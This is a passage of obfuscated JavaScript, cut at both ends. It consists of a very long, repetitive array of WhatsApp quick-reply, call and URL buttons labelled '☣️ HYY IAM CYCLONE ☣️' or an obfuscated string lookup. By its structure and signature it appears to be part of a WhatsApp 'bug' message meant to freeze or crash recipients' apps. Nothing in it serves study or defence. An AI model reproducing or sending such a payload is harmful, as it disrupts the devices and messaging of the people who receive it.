},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x